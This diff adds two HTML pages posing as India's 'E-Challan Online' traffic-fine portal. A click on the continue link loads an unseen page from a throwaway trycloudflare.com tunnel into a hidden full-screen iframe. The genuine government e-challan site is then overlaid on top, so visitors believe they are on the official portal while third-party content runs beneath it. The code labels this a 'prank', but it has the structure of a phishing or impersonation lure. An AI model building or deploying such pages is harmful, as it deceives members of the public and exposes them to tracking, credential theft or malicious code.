@@ -1,0 +1,186 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Echellan</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    .page-a {
+  padding: 50px;
+  text-align: center;
+
+  min-height: 100vh;
+  box-sizing: border-box;
+
+  background-color: white;
+  color: black;
+}
+
+    #pageB, #pageC {
+      display: none;
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      border: 0;
+    }
+
+    #pageB {
+      z-index: 10;
+    }
+
+    #pageC {
+      z-index: 20;
+      background: white;
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: 0;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="page-a">
+    <h1>E-Challan Online</h1>
+    <!--<p>Click the link below to continue.</p> -->
+
+    <a href="#" onclick="startPrank(event)">
+      Click here to continue
+    </a>
+  </div>
+
+  <div id="pageB">
+    <iframe id="frameB" title="Page B"></iframe>
+  </div>
+
+  <div id="pageC">
+    <iframe id="frameC" title="Page C"></iframe>
+  </div>
+
+  <script>
+    function startPrank(event) {
+      event.preventDefault();
+
+      // Load your self-made Page B
+      document.getElementById("frameB").src =
+        "https://private-airports-moral-stating.trycloudflare.com";
+
+      document.getElementById("pageB").style.display = "block";
+
+      // Show Page C on top
+      document.getElementById("frameC").src =
+        " https://echallan.parivahan.nic.in/challan";
+
+      document.getElementById("pageC").style.display = "block";
+    }
+  </script>
+
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Page A</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    .page-a {
+      padding: 50px;
+      text-align: center;
+
+      min-height: 100vh;
+      box-sizing: border-box;
+
+      background-image:
+        linear-gradient(rgba(0, 0, 0, 0.4),
+                        rgba(0, 0, 0, 0.4)),
+        url("background.png");
+
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+
+      color: white;
+    }
+
+    #pageB, #pageC {
+      display: none;
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      border: 0;
+    }
+
+    #pageB {
+      z-index: 10;
+    }
+
+    #pageC {
+      z-index: 20;
+      background: white;
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: 0;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="page-a">
+    <h1>E-Challan Online</h1>
+    <!--<p>Click the link below to continue.</p> -->
+
+    <a href="#" onclick="startPrank(event)">
+      Click here to continue
+    </a>
+  </div>
+
+  <div id="pageB">
+    <iframe id="frameB" title="Page B"></iframe>
+  </div>
+
+  <div id="pageC">
+    <iframe id="frameC" title="Page C"></iframe>
+  </div>
+
+  <script>
+    function startPrank(event) {
+      event.preventDefault();
+
+      // Load your self-made Page B
+      document.getElementById("frameB").src =
+        "https://mortgages-sydney-bishop-available.trycloudflare.com";
+
+      document.getElementById("pageB").style.display = "block";
+
+      // Show Page C on top
+      document.getElementById("frameC").src =
+        " https://echallan.parivahan.nic.in/challan";
+
+      document.getElementById("pageC").style.display = "block";
+    }
+  </script>
+
+</body>
+</html>
